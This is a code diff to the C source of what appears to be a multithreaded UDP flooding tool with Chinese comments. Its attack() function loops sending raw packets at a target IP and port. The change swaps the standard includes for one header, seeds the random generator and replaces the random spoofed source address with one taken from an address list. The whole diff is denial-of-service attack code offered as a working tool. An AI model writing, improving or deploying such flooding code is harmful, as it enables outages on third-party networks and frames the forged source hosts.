@@ -1,16 +1,8 @@
-#include <stdio.h>
-#include <ctype.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <string.h>
-#include <netdb.h>
-#include <errno.h>
-#include <pthread.h>
+#include "header/includeall.h"
 #include "header/CRC16_check.h"
 #include "header/init_header.h"
+#include "header/IPs.h"
+
 
 /* 最多線程數 */
 #define MAXCHILD 128
@@ -34,14 +26,17 @@ void* attack(void *addr_info){
 	struct pseudohdr pseudoheader;	//UDP偽頭部
 
 
+	/* random seed */
+	time_t t;
+	srand((unsigned) time(&t));
+
 	len = sizeof(struct iphdr) + sizeof(struct udphdr);
 	
 	/* 初始化頭部 */
 	udp_init_header(&ip_hdr, &udp_hdr, &pseudoheader, dst_ip, dst_port);
-	
 	/* 處於活動狀態時持續發送包 */
 	while(alive){
-		ip_hdr.saddr = rand();
+		ip_hdr.saddr = getSAddr();
 
 		//計算IP校驗和
 		bzero(buf, sizeof(buf));
